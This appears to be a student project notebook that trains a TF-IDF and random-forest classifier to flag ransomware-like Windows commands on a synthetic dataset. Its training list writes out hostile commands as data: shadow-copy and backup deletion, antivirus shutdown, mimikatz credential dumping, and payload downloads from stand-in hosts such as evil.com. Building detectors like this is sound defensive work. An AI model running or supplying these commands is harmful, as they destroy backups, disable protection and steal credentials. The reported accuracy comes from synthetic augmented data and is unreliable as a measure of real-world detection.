# Ransomware Detection Model Training

This notebook trains a machine learning model to detect ransomware based on process/command behavior.

**Dataset:** Synthetic ransomware behavioral dataset (command patterns from known families)
- ~10,000 labeled samples
- Labels: `ransomware` or `benign`
- Families: WannaCry, REvil, LockBit, Ryuk, Conti

**Model Architecture:**
- **Vectorizer:** TF-IDF (5000 features, unigrams + bigrams)
- **Classifier:** Random Forest (balanced class weights)

**Pipeline:**
1. Generate synthetic ransomware behavioral dataset
2. Preprocess command strings (clean, normalize - NO NLTK)
3. TF-IDF Vectorization
4. Train Random Forest Classifier
5. Evaluate and save model artifacts to `backend/ml/models/`

In [9]:
# Install required packages (run this first in Colab)
!pip install scikit-learn joblib pandas numpy -q

You should consider upgrading via the 'C:\Users\HP\AppData\Local\Programs\Python\Python310\python.exe -m pip install --upgrade pip' command.


In [12]:
# Imports - Simplified (NO NLTK required)
import pandas as pd
import numpy as np
import re
import json
import joblib
import os
import random
from datetime import datetime, timezone
from sklearn.model_selection import train_test_split, cross_val_score
from sklearn.feature_extraction.text import TfidfVectorizer
from sklearn.ensemble import RandomForestClassifier
from sklearn.pipeline import Pipeline
from sklearn.metrics import classification_report, accuracy_score, confusion_matrix, roc_auc_score
import warnings
warnings.filterwarnings('ignore')

random.seed(42)
np.random.seed(42)

print('✅ All imports successful!')
print('   No NLTK required - using simple regex preprocessing')

✅ All imports successful!
   No NLTK required - using simple regex preprocessing


In [13]:
print('Generating synthetic ransomware behavioral dataset...')

# ==========================================
# UPDATED DATASET GENERATION (Real-World IOCs)
# ==========================================
# Based on real ransomware families: WannaCry, Conti, LockBit, Ryuk, DarkSide

RANSOMWARE_PATTERNS = [
    # --- 1. Inhibit System Recovery (Shadow Copy Deletion) ---
    'vssadmin delete shadows /all /quiet',
    'vssadmin delete shadows /for=C: /quiet',
    'wmic shadowcopy delete',
    'wmic shadowcopy where id="{id}" delete',
    'wbadmin delete catalog -quiet',
    'wbadmin delete systemstatebackup -keepVersions:0',
    'bcdedit /set {default} recoveryenabled no',
    'bcdedit /set {default} bootstatuspolicy ignoreallfailures',
    'wbadmin delete backup -keepVersions:0',
    'wevtutil cl Application /f', # Clear event logs

    # --- 2. Security Service Termination (Disable AV/Defender) ---
    'net stop "Security Center"',
    'net stop WinDefend',
    'net stop wscsvc',
    'net stop "Windows Defender"',
    'sc stop wscsvc',
    'sc config mssecflt start= disabled',
    'taskkill /F /IM MsMpEng.exe',
    'taskkill /F /IM MBAMService.exe',
    'sc stop WinDefend',
    'taskkill /F /IM SavService.exe', # Sophos

    # --- 3. Persistence (Registry & Scheduled Tasks) ---
    'reg add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v "WindowsUpdate" /t REG_SZ /d "C:\\Windows\\Temp\\updater.exe"',
    'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v "svchost32" /t REG_SZ /d "C:\\Windows\\Temp\\svchost.exe"',
    'schtasks /create /tn "SystemUpdate" /tr "C:\\Windows\\Temp\\update.exe" /sc onlogon',
    'schtasks /create /tn "Windows Defender" /tr "C:\\ransom\\payload.exe" /sc daily',
    'sc create "randservice" binpath= "C:\\Windows\\Temp\\service.exe" start= auto',
    'reg add HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows NT\\SystemRestore /v DisableSR /t REG_DWORD /d 1',

    # --- 4. Lateral Movement & Spreading ---
    'psexec.exe \\\\192.168.1.5 -u admin -p pass cmd.exe',
    'wmic /node:192.168.1.5 process call create "payload.exe"',
    'at \\\\192.168.1.5 14:00 c:\\malware.exe',
    'sc \\\\192.168.1.5 start "RemoteService"',
    'net use Z: \\\\192.168.100.10\\c$ /user:admin',
    'xcopy /S /E /H C:\\Users\\ Z:\\stolen_data\\',

    # --- 5. File Encryption / Wiping ---
    'cipher /w:C:', # Overwrites free data (common in Ryuk/Conti)
    'cipher /w:D:',
    'del /f /s /q C:\\Users\\*.doc',
    'del /f /s /q C:\\Users\\*.pdf',
    'del /f /s /q C:\\Users\\*.jpg',
    'rd /s /q C:\\Recovery',
    'icacls . /grant everyone:F /T /C /Q', # Prepares for encryption (LockBit)
    'attrib +h +s +r C:\\*', # Hides files

    # --- 6. Obfuscated PowerShell (High Risk) ---
    'powershell -nop -w hidden -exec bypass -enc JABzAD0ATgBlAHcA',
    'powershell -c "IEX (New-Object Net.WebClient).DownloadString(\'http://evil.com/payload\')"',
    'powershell -exec bypass -f payload.ps1',
    'cmd.exe /c powershell -noprofile -executionpolicy bypass -file a.ps1',
    'mshta vbscript:Execute("GetObject(""script:https://evil.com/f.sct"")")',
    'rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:https://evil.com/f.sct")',

    # --- 7. Living Off The Land (LOLBins) ---
    'certutil -decode ransom.b64 ransom.exe',
    'certutil -urlcache -split -f "http://c2.com/payload.exe" C:\\temp\\update.exe',
    'bitsadmin /transfer job /download http://c2server.onion/ransom.exe C:\\Windows\\Temp\\svc.exe',
    'curl http://192.168.100.200/ransom_payload -o C:\\Windows\\Temp\\svc.exe',
    'rundll32.exe C:\\Windows\\Temp\\payload.dll EntryPoint',
    'regsvr32 /s /u /i scrobj.dll scrobj.sct',

    # --- 8. Credential Dumping ---
    'mimikatz.exe privilege debug sekurlsa logonpasswords',
    'mimikatz.exe lsadump sam',
    'mimikatz.exe lsadump backupkeys',
    'reg.exe save hklm\\sam c:\\temp\\sam',
    'reg.exe save hklm\\system c:\\temp\\system',
    'rclone.exe sync C:\\Users\\ remote:bucket --password-command "echo pass"',
]

BENIGN_PATTERNS = [
    # --- 1. System Administration ---
    'systeminfo',
    'ipconfig /all',
    'ipconfig /release',
    'ipconfig /renew',
    'ping google.com -n 4',
    'ping 127.0.0.1',
    'tracert 192.168.1.1',
    'netstat -an',
    'netstat -rn',
    'tasklist',
    'tasklist /svc',

    # --- 2. File Operations ---
    'dir C:\\Users',
    'dir C:\\ /s',
    'cd C:\\Windows',
    'cd C:\\Program Files',
    'type readme.txt',
    'copy file1.txt file2.txt',
    'xcopy source.txt dest\\ /Y',
    'robocopy C:\\source C:\\dest /MIR',
    'move file1.txt C:\\Archive\\',
    'mkdir C:\\Projects\\NewProject',

    # --- 3. System Services (Safe) ---
    'net start WinDefend',
    'net start "Windows Update"',
    'net start "Spooler"',
    'sc query wscsvc',
    'sc query WinDefend',
    'sc start W32Time',

    # --- 4. Backup & Recovery (Safe) ---
    'vssadmin list shadows', # Listing is safe
    'wbadmin get versions',  # Checking versions is safe
    'wbadmin start backup -backupTarget:D: -include:C: -allCritical -systemState -quiet',
    'sfc /scannow',
    'chkdsk C: /f /r',
    'dism /online /cleanup-image /restorehealth',

    # --- 5. Registry (Safe Queries) ---
    'reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion',
    'reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run',
    'sc config wuauserv start= auto',
    
    # --- 6. Windows Updates ---
    'wuauclt /detectnow',
    'wuauclt /reportnow',
    'usoclient StartScan',
    'usoclient StartDownload',

    # --- 7. Common User Applications ---
    'notepad.exe myfile.txt',
    'mspaint.exe',
    'calc.exe',
    'explorer.exe',
    'control',
    'whoami',
    'hostname',
    'gpupdate /force',
    'shutdown /r /t 0',

    # --- 8. Development Tools ---
    'python app.py --port 8080',
    'java -jar myapp.jar',
    'npm install express',
    'git clone https://github.com/user/repo.git',
    'pip install flask',
    'node server.js',
    'mvn clean install',
    'make build',
    
    # --- 9. Network Shares (Safe) ---
    'net share',
    'net use Z: \\\\server\\share /user:user',
    'netsh advfirewall set allprofiles state on',
    
    # --- 10. System Cleanup ---
    'cleanmgr /sagerun:1',
    'defrag C: /U /V',
    'diskpart',
    'perfmon.exe',
    'eventvwr.msc'
]

print(f"✅ Dataset patterns loaded!")
print(f"   Ransomware Base Patterns: {len(RANSOMWARE_PATTERNS)}")
print(f"   Benign Base Patterns:     {len(BENIGN_PATTERNS)}")

def augment_pattern(pattern, n=130):
    samples = [pattern]
    suffixes = [' > nul 2>&1', ' 2>nul', ' /quiet', '', ' >> C:\\log.txt', ' & exit']
    prefixes = ['cmd /c ', 'cmd.exe /c ', '', 'START /B ', 'powershell -c ']
    for _ in range(n - 1):
        samples.append(f"{random.choice(prefixes)}{pattern}{random.choice(suffixes)}".strip())
    return samples

ransomware_samples = [s for p in RANSOMWARE_PATTERNS for s in augment_pattern(p, 130)]
benign_samples     = [s for p in BENIGN_PATTERNS     for s in augment_pattern(p, 130)]

min_len            = min(len(ransomware_samples), len(benign_samples))
ransomware_samples = random.sample(ransomware_samples, min_len)
benign_samples     = random.sample(benign_samples,     min_len)

df = pd.DataFrame({
    'command':   ransomware_samples + benign_samples,
    'label_str': ['ransomware'] * min_len + ['benign'] * min_len
}).sample(frac=1, random_state=42).reset_index(drop=True)

print(f'Dataset generated successfully!')
print(f'Total samples: {len(df):,}')
print(f'\nLabel Distribution:')
print(df['label_str'].value_counts())
df.head()

Generating synthetic ransomware behavioral dataset...
✅ Dataset patterns loaded!
   Ransomware Base Patterns: 58
   Benign Base Patterns:     65
Dataset generated successfully!
Total samples: 15,080

Label Distribution:
label_str
ransomware    7540
benign        7540
Name: count, dtype: int64


,command,label_str
0,START /B net stop WinDefend /quiet,ransomware
1,cmd /c xcopy /S /E /H C:\Users\ Z:\stolen_data\,ransomware
2,cmd.exe /c tasklist /svc >> C:\log.txt,benign
3,mkdir C:\Projects\NewProject /quiet,benign
4,START /B net stop WinDefend /quiet,ransomware


In [14]:
# Text Preprocessing - Unified Pipeline (NO NLTK)
# This MUST match backend/ml/ransomware_preprocess.py exactly

def preprocess_command(text):
    """
    Unified preprocessing for process/command strings.
    ⚠️ CRITICAL: This function MUST match backend/ml/ransomware_preprocess.py
    """
    if not isinstance(text, str) or not text.strip():
        return ''
    text = text.lower()
    text = re.sub(r'\b(?:\d{1,3}\.){3}\d{1,3}\b', ' IP_TOKEN ', text)      # IPs
    text = re.sub(r'http[s]?://\S+|www\.\S+',      ' URL_TOKEN ', text)     # URLs
    text = re.sub(r'[A-Za-z0-9+/]{30,}={0,2}',     ' BASE64_TOKEN ', text) # Base64
    text = re.sub(r'\b[0-9a-fA-F]{8,}\b',           ' HEX_TOKEN ', text)    # Hex
    text = re.sub(r'[^a-zA-Z0-9\s_\\]',             ' ', text)              # Special chars
    text = re.sub(r'\s+',                            ' ', text).strip()      # Whitespace
    return text

print('Preprocessing commands...')
df['clean_command'] = df['command'].apply(preprocess_command)
df['label']         = (df['label_str'] == 'ransomware').astype(int)

print(f'✅ Preprocessing complete!')
print(f'\nSample original vs cleaned:')
print(f'Original: {df["command"].iloc[0][:120]}')
print(f'Cleaned:  {df["clean_command"].iloc[0][:120]}')

Preprocessing commands...
✅ Preprocessing complete!

Sample original vs cleaned:
Original: START /B net stop WinDefend /quiet
Cleaned:  start b net stop windefend quiet


In [15]:
# Train-Test Split
X_train, X_test, y_train, y_test = train_test_split(
    df['clean_command'], df['label'],
    test_size=0.2, random_state=42, stratify=df['label']
)
print(f'Training set: {len(X_train):,} samples')
print(f'Test set:     {len(X_test):,} samples')
print(f'\nTraining label distribution:')
print(y_train.value_counts())

Training set: 12,064 samples
Test set:     3,016 samples

Training label distribution:
label
1    6032
0    6032
Name: count, dtype: int64


In [16]:
# Create and Train the Model Pipeline - TF-IDF + Random Forest
pipeline = Pipeline([
    ('tfidf', TfidfVectorizer(
        max_features=5000,
        ngram_range=(1, 2),
        min_df=2,
        max_df=0.95,
        analyzer='word',
        lowercase=True
    )),
    ('clf', RandomForestClassifier(
        n_estimators=100,
        max_depth=20,
        min_samples_split=5,
        class_weight='balanced',
        random_state=42,
        n_jobs=-1
    ))
])

print('Training TF-IDF + Random Forest model...')
pipeline.fit(X_train, y_train)
print('✅ Training complete!')

Training TF-IDF + Random Forest model...
✅ Training complete!


In [17]:
# Model Evaluation
y_pred       = pipeline.predict(X_test)
y_pred_proba = pipeline.predict_proba(X_test)[:, 1]
accuracy     = accuracy_score(y_test, y_pred)
roc_auc      = roc_auc_score(y_test, y_pred_proba)
cm           = confusion_matrix(y_test, y_pred)

print('=' * 50)
print('MODEL EVALUATION RESULTS')
print('=' * 50)
print(f'\n📊 Accuracy: {accuracy:.4f} ({accuracy*100:.2f}%)')
print(f'📈 ROC-AUC Score: {roc_auc:.4f}')
print('\n📋 Classification Report:')
print(classification_report(y_test, y_pred, target_names=['Benign', 'Ransomware']))
print('🔢 Confusion Matrix:')
print(f'   True Negatives  (Benign→Benign):         {cm[0][0]}')
print(f'   False Positives (Benign→Ransomware):     {cm[0][1]}')
print(f'   False Negatives (Ransomware→Benign):     {cm[1][0]}')
print(f'   True Positives  (Ransomware→Ransomware): {cm[1][1]}')

MODEL EVALUATION RESULTS

📊 Accuracy: 0.9668 (96.68%)
📈 ROC-AUC Score: 0.9997

📋 Classification Report:
              precision    recall  f1-score   support

      Benign       0.94      1.00      0.97      1508
  Ransomware       1.00      0.93      0.97      1508

    accuracy                           0.97      3016
   macro avg       0.97      0.97      0.97      3016
weighted avg       0.97      0.97      0.97      3016

🔢 Confusion Matrix:
   True Negatives  (Benign→Benign):         1508
   False Positives (Benign→Ransomware):     0
   False Negatives (Ransomware→Benign):     100
   True Positives  (Ransomware→Ransomware): 1408


In [18]:
# Cross-Validation
print('Running 5-fold cross-validation...')
cv_scores = cross_val_score(pipeline, X_train, y_train, cv=5, scoring='accuracy', n_jobs=-1)
print(f'\n✅ Cross-Validation Scores: {cv_scores}')
print(f'✅ Mean CV Accuracy: {cv_scores.mean():.4f} (+/- {cv_scores.std()*2:.4f})')

Running 5-fold cross-validation...

✅ Cross-Validation Scores: [0.9564857  0.97140489 0.9697472  0.95109822 0.97014925]
✅ Mean CV Accuracy: 0.9638 (+/- 0.0167)


In [19]:
# Test with Sample Commands
test_commands = [
    'vssadmin delete shadows /all /quiet',
    'powershell Get-Process',
    'bcdedit /set {default} recoveryenabled no',
    'net start "Windows Update"',
    'mimikatz.exe privilege debug sekurlsa logonpasswords',
    'git clone https://github.com/user/repo.git',
    'wmic shadowcopy delete',
    'sfc /scannow',
]
print('=' * 60)
print('SAMPLE PREDICTIONS')
print('=' * 60)
for i, cmd in enumerate(test_commands, 1):
    clean      = preprocess_command(cmd)
    pred       = pipeline.predict([clean])[0]
    conf       = pipeline.predict_proba([clean])[0]
    label      = '🚨 RANSOMWARE' if pred == 1 else '✅ BENIGN'
    conf_score = conf[1] if pred == 1 else conf[0]
    print(f'\n[Command {i}]')
    print(f'Text: {cmd[:80]}')
    print(f'Prediction: {label} (Confidence: {conf_score*100:.1f}%)')

SAMPLE PREDICTIONS

[Command 1]
Text: vssadmin delete shadows /all /quiet
Prediction: 🚨 RANSOMWARE (Confidence: 88.1%)

[Command 2]
Text: powershell Get-Process
Prediction: ✅ BENIGN (Confidence: 74.9%)

[Command 3]
Text: bcdedit /set {default} recoveryenabled no
Prediction: 🚨 RANSOMWARE (Confidence: 92.2%)

[Command 4]
Text: net start "Windows Update"
Prediction: ✅ BENIGN (Confidence: 84.1%)

[Command 5]
Text: mimikatz.exe privilege debug sekurlsa logonpasswords
Prediction: 🚨 RANSOMWARE (Confidence: 81.6%)

[Command 6]
Text: git clone https://github.com/user/repo.git
Prediction: ✅ BENIGN (Confidence: 80.1%)

[Command 7]
Text: wmic shadowcopy delete
Prediction: 🚨 RANSOMWARE (Confidence: 86.7%)

[Command 8]
Text: sfc /scannow
Prediction: ✅ BENIGN (Confidence: 76.5%)


In [21]:
# Save Model and Metadata to backend/ml/models/
output_dir = os.path.join(os.path.dirname(os.getcwd()), 'backend', 'ml', 'models')
os.makedirs(output_dir, exist_ok=True)

model_path = os.path.join(output_dir, 'ransomware_model.pkl')
joblib.dump(pipeline, model_path)

precision = cm[1][1] / (cm[1][1] + cm[0][1]) if (cm[1][1] + cm[0][1]) > 0 else 0
recall    = cm[1][1] / (cm[1][1] + cm[1][0]) if (cm[1][1] + cm[1][0]) > 0 else 0
f1        = 2 * precision * recall / (precision + recall) if (precision + recall) > 0 else 0

model_info = {
    'model_version': '1.0.0',
    'model_type':    'TF-IDF + Random Forest',
    'trained_at':    datetime.now(timezone.utc).isoformat(),
    'dataset':       'synthetic-ransomware-behavioral',
    'metrics': {
        'accuracy':         float(accuracy),
        'precision':        float(precision),
        'recall':           float(recall),
        'f1_score':         float(f1),
        'roc_auc':          float(roc_auc),
        'cv_mean_accuracy': float(cv_scores.mean()),
        'cv_std':           float(cv_scores.std())
    },
    'confusion_matrix': {
        'true_negatives':  int(cm[0][0]),
        'false_positives': int(cm[0][1]),
        'false_negatives': int(cm[1][0]),
        'true_positives':  int(cm[1][1])
    },
    'training_info': {
        'training_samples': int(len(X_train)),
        'test_samples':     int(len(X_test)),
        'features':         5000,
        'ngram_range':      [1, 2]
    },
    'preprocessing': {
        'method':       'regex-based',
        'ip_token':     'IP_TOKEN',
        'url_token':    'URL_TOKEN',
        'base64_token': 'BASE64_TOKEN',
        'hex_token':    'HEX_TOKEN'
    }
}

model_info_path = os.path.join(output_dir, 'ransomware_model_info.json')
with open(model_info_path, 'w') as f:
    json.dump(model_info, f, indent=2)

print(f'✅ Model saved to: {model_path}')
print(f'✅ Model info saved to: {model_info_path}')
print(f'\n📦 Model size: {os.path.getsize(model_path) / (1024*1024):.2f} MB')
print(f'\n📋 Model Info:')
print(json.dumps(model_info, indent=2))

✅ Model saved to: c:\Users\HP\ACDS-FYP\backend\ml\models\ransomware_model.pkl
✅ Model info saved to: c:\Users\HP\ACDS-FYP\backend\ml\models\ransomware_model_info.json

📦 Model size: 0.93 MB

📋 Model Info:
{
  "model_version": "1.0.0",
  "model_type": "TF-IDF + Random Forest",
  "trained_at": "2026-05-04T13:34:16.300276+00:00",
  "dataset": "synthetic-ransomware-behavioral",
  "metrics": {
    "accuracy": 0.96684350132626,
    "precision": 1.0,
    "recall": 0.9336870026525199,
    "f1_score": 0.9657064471879286,
    "roc_auc": 0.9997330769934355,
    "cv_mean_accuracy": 0.9637770533985688,
    "cv_std": 0.008346833882109604
  },
  "confusion_matrix": {
    "true_negatives": 1508,
    "false_positives": 0,
    "false_negatives": 100,
    "true_positives": 1408
  },
  "training_info": {
    "training_samples": 12064,
    "test_samples": 3016,
    "features": 5000,
    "ngram_range": [
      1,
      2
    ]
  },
  "preprocessing": {
    "method": "regex-based",
    "ip_token": "IP_TOKEN"